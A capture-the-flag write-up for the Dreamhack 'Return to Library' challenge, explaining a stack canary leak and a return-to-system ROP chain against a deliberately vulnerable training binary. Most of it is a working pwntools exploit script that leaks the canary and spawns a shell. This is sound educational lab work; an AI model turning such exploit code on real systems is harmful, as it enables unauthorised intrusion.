+++
date = '2026-05-08'
draft = false
title = 'Dreamhack Return to Library Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
Exploit Tech: Return to Library에서 실습하는 문제입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  system("echo 'system@plt'");
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100u);
  printf("Buf: %s\n", buf);
  puts("[2] Overwrite return address");
  printf("Buf: ");
  read(0, buf, 0x100u);
  return 0;
}
```

## Identifying the vulnerabilities


Another buffer overflow challenge with the canary enabled - same tech of leaking the canary as all the previous challenges, by overwriting
the canary's null byte so it gets printed alongside `buf` (since they're consecutive in memory).

The binary already has `system` in its plt so we only need to `pop rdi; ret` with the "/bin/sh" string and system plt, without leaking libc at all.

Since system@plt was available, I was pretty sure that so was "/bin/sh", and looks like I was right:

```asm
.rodata:0000000000400874 aBinSh          db '/bin/sh',0          ; DATA XREF: .data:binsh↓o
```

I assembled the final payload, and now let's connect remotely and get the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/ret2lib/rtl')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:8344'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#first leak
payload = b"A"*56 + b"G"
p.recvuntil(b": ")
p.send(payload)

p.recvuntil(b"G")
data = p.recv(7)
val = u64(data.rjust(8, b"\x00"))

print(f"canary value is {hex(val)}")

pop_rdi_ret = 0x400853
ret = 0x400596
binsh = 0x400874
system_plt = elf.plt[b'system']

#build payload
payload = ( b"A"*56 + #buf
            p64(val) + #canary
            b"B"*8 + #rbp
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) + 
            p64(system_plt)
          )
          
p.sendline(payload)
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/structpersont.py)**.
